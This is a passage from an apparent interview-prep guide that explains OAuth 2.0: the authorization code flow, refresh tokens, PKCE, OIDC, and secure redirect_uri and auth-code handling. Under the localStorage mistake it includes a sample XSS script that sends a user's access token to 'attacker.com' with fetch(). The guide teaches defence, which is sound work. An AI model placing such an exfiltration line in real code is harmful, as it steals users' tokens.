- Valet key only starts the car and locks/unlocks doors
- Can't open trunk or glove compartment (limited scope)
- You can revoke valet key anytime without changing your main key
- Like OAuth giving app limited access

**In Simple Terms:**

OAuth 2.0 lets you give apps permission to access your data **without sharing your password**.

**Example:**
- You want to use "Photo Printer" app to print your Google Photos
- Without OAuth: Give Photo Printer your Google password (dangerous!)
- With OAuth: Google asks "Allow Photo Printer to view your photos?" (safe!)

**Key Concepts:**

**1. Authorization vs Authentication:**
- **Authentication**: "Who are you?" (Login)
- **Authorization**: "What can you do?" (Permissions)
- OAuth is for **authorization**, not authentication (that's OIDC)

**2. The Parties Involved:**
- **Resource Owner**: You (the user)
- **Client**: The app requesting access (Photo Printer)
- **Authorization Server**: Who confirms permissions (Google)
- **Resource Server**: Where your data lives (Google Photos API)

**3. The Flow (Authorization Code):**

```
1. App redirects you to Google:
   "Hey Google, Photo Printer wants to view user's photos"

2. You log in to Google and see:
   "Photo Printer wants to:
    ✓ View your photos
    [ Allow ] [ Deny ]"

3. You click Allow

4. Google redirects back to Photo Printer with a code:
   "https://photoprinter.com/callback?code=ABC123"

5. Photo Printer exchanges code for access token (server-to-server):
   POST to Google: "Here's code ABC123, give me access token"
   Google responds: "Here's access token XYZ789"

6. Photo Printer uses access token to get your photos:
   GET /photos
   Authorization: Bearer XYZ789
```

**Why the Code Exchange?**

Beginner question: "Why not just send the access token directly?"

**Answer:** Security!

```javascript
// ❌ BAD (Implicit Flow - deprecated):
// Token in URL (visible in browser history, referrer)
https://photoprinter.com/callback#access_token=XYZ789

// ✅ GOOD (Authorization Code Flow):
// Code in URL (useless without client secret)
https://photoprinter.com/callback?code=ABC123

// Then server-to-server exchange:
POST /token
{
  code: 'ABC123',
  client_secret: 'super_secret' // ✅ Not visible in browser
}
```

**Common Scenarios:**

**Scenario 1: "Sign in with Google" Button**

```javascript
// When you click "Sign in with Google"
// 1. App redirects you to Google
<button onClick={() => {
  window.location.href =
    'https://accounts.google.com/oauth/authorize' +
    '?client_id=PHOTO_PRINTER_ID' +
    '&redirect_uri=https://photoprinter.com/callback' +
    '&response_type=code' +
    '&scope=read:photos';
}}>
  Sign in with Google
</button>

// 2. You approve on Google's website
// 3. Google redirects back with code
// 4. App exchanges code for token
// 5. App can now access your photos
```

**Scenario 2: Token Expiration and Refresh**

```javascript
// Access tokens expire (e.g., 1 hour)
// Refresh tokens last longer (e.g., 30 days)

// When access token expires:
GET /photos
Authorization: Bearer EXPIRED_TOKEN
// Response: 401 Unauthorized

// App uses refresh token to get new access token:
POST /token
{
  grant_type: 'refresh_token',
  refresh_token: 'LONG_LIVED_TOKEN'
}
// Response: { access_token: 'NEW_TOKEN', expires_in: 3600 }

// Retry original request:
GET /photos
Authorization: Bearer NEW_TOKEN
// Response: 200 OK + your photos
```

**Common Beginner Mistakes:**

**Mistake 1: Confusing OAuth with Login**
```javascript
// ❌ OAuth alone is NOT authentication
// You get access to user's data, but not confirmed identity

// ✅ Use OpenID Connect (OIDC) for login
// OIDC = OAuth + ID token with user info
```

**Mistake 2: Storing Tokens in localStorage (SPAs)**
```javascript
// ❌ BAD: XSS can steal token
localStorage.setItem('access_token', token);

// Attacker injects script:
fetch('https://attacker.com', {
  method: 'POST',
  body: localStorage.getItem('access_token')
});

// ✅ GOOD: Use httpOnly cookie (via backend)
// Or store in memory (lost on refresh, but secure)
```

**Mistake 3: Not Validating redirect_uri**
```javascript
// ❌ BAD: Accept any redirect URI
if (req.query.redirect_uri.includes('myapp.com')) {
  // Allows: myapp.com.attacker.com
}

// ✅ GOOD: Exact match
if (req.query.redirect_uri === registeredRedirectURI) {
  // Only allows exact match
}
```

**Interview Answer Template:**

**Question: "Explain how OAuth 2.0 works."**

**2-Minute Answer:**

"OAuth 2.0 is an authorization framework that allows applications to access user data without requiring the user's password.

**The flow works like this:**

1. **User Initiates**: User clicks 'Sign in with Google' on third-party app
2. **Redirect to Auth Server**: App redirects to Google's authorization endpoint
3. **User Approves**: User logs in and sees consent screen: 'App X wants to access your photos'
4. **Authorization Code**: Google redirects back to app with temporary authorization code
5. **Token Exchange**: App exchanges code for access token (server-to-server with client secret)
6. **Access Resources**: App uses access token to make API requests on user's behalf

**Key Security Features:**

- **Limited Scope**: App only gets permissions user approved (e.g., 'read:photos')
- **Token Expiration**: Access tokens are short-lived (1 hour)
- **Revocable**: User can revoke access anytime without changing password
- **No Password Sharing**: App never sees user's password

**For SPAs (React, Vue)**, we use **PKCE** (Proof Key for Code Exchange) instead of client secret since SPAs can't securely store secrets. PKCE generates a random code verifier and sends its hash (code challenge) with the authorization request, then proves possession of the verifier during token exchange.

**Example:**
```javascript
// 1. Generate PKCE values
const codeVerifier = generateRandom();
const codeChallenge = sha256(codeVerifier);

// 2. Authorization request includes challenge
GET /authorize?code_challenge=HASH&code_challenge_method=S256

// 3. Token exchange includes verifier
POST /token { code: 'ABC', code_verifier: 'ORIGINAL' }
// Server verifies: sha256(codeVerifier) === codeChallenge
```

**Common pitfall**: Don't store access tokens in localStorage (vulnerable to XSS). Use httpOnly cookies or memory storage."

**Follow-Up Concepts:**

**Q: "What's the difference between OAuth and OpenID Connect?"**

A: "OAuth 2.0 is for **authorization** (granting access to resources), while OpenID Connect (OIDC) is for **authentication** (verifying user identity).

**OAuth alone**:
- App gets access token to call APIs
- No standard way to get user info
- You know you can access photos, but not whose photos

**OIDC (OAuth + ID token)**:
- App gets access token AND ID token
- ID token is a JWT with user info (name, email, sub)
- You know exactly who the user is

Example:
```javascript
// OAuth response:
{
  "access_token": "xyz",
  "token_type": "Bearer"
}

// OIDC response:
{
  "access_token": "xyz",
  "id_token": "eyJhbGc...", // JWT with user info
  "token_type": "Bearer"
}

// Decode ID token:
{
  "sub": "user123",
  "name": "Alice",
  "email": "alice@example.com"
}
```

Use **OAuth** when: Accessing user's data (Google Drive, GitHub repos)
Use **OIDC** when: Logging user into your app"

**Visual Learning Aid:**

```
OAuth 2.0 Authorization Code Flow:

┌─────────┐                                        ┌──────────────┐
│  User   │                                        │   Client     │
│(Browser)│                                        │   (App)      │
└────┬────┘                                        └──────┬───────┘
     │                                                    │
     │ 1. Click "Sign in with Google"                    │
     │──────────────────────────────────────────────────>│
     │                                                    │
     │ 2. Redirect to Google                             │
     │<──────────────────────────────────────────────────│
     │                                                    │
┌────┴────────────────────────────────┐                  │
│ Google Authorization Server         │                  │
│                                     │                  │
│  3. User logs in                    │                  │
│  4. Consent: "Allow Photo Printer?" │                  │
│     [X] View photos                 │                  │
│     [ Allow ]                       │                  │
└────┬────────────────────────────────┘                  │
     │                                                    │
     │ 5. Redirect with code                             │
     │──────────────────────────────────────────────────>│
     │ /callback?code=ABC123                             │
     │                                                    │
     │                                    6. Exchange code│
     │                                       for token    │
     │                                    ┌───────────────┤
     │                                    │ POST /token   │
     │                                    │ code=ABC123   │
     │                                    │ secret=***    │
     │                                    └───────────────┤
     │                                                    │
     │                                    7. Access token │
     │                                    <───────────────┤
     │                                       XYZ789       │
     │                                                    │
     │ 8. Access granted!                                 │
     │<──────────────────────────────────────────────────│
```

**Key Takeaways:**

1. OAuth = **Authorization** (permissions), not authentication
2. **Never share passwords** - use OAuth instead
3. **Scopes** = specific permissions (read:photos, write:posts)
4. **Access tokens** = short-lived, **refresh tokens** = long-lived
5. **SPAs** use PKCE (no client secret)
6. **Don't store tokens in localStorage** (use httpOnly cookies or memory)

</details>

### Common Mistakes

❌ **Wrong**: Weak redirect URI validation
```javascript
// Allows subdomain hijacking
if (providedURI.startsWith(registeredURI)) {
  return true; // ❌ Accepts callback.attacker.com
}
```

✅ **Correct**: Exact redirect URI matching
```javascript
// Exact match required
if (providedURI === registeredURI) {
  return true;
}
```

---

❌ **Wrong**: Not binding authorization code to redirect URI
```javascript
// Attacker can change redirect_uri during token exchange
const authCode = createCode({ clientId, userId });
```

✅ **Correct**: Store and validate redirect_uri
```javascript
const authCode = createCode({
  clientId,
  userId,
  redirectUri // ✅ Bind to specific URI
});

// Validate during exchange
if (storedCode.redirectUri !== providedRedirectUri) {
  throw new Error('redirect_uri mismatch');
}
```

---

❌ **Wrong**: Long-lived authorization codes
```javascript
// Code valid for 1 hour
const code = { expiresAt: Date.now() + 60 * 60 * 1000 };
```

✅ **Correct**: Short-lived, single-use codes
```javascript
// Code valid for 10 minutes, single-use
const code = {
  expiresAt: Date.now() + 10 * 60 * 1000,
  used: false
};

// Mark as used immediately
await AuthCode.updateOne({ code }, { $set: { used: true } });
```

### Follow-up Questions

1. "How does PKCE protect against authorization code interception?"
2. "What's the difference between OAuth 2.0 and OpenID Connect?"
3. "How would you implement token rotation for refresh tokens?"
4. "What are the security implications of the Implicit Flow?"
5. "How do you prevent open redirect vulnerabilities in OAuth?"

### Resources

- [OAuth 2.0 RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749)
- [PKCE RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [Auth0: OAuth 2.0 Flows](https://auth0.com/docs/get-started/authentication-and-authorization-flow)

---
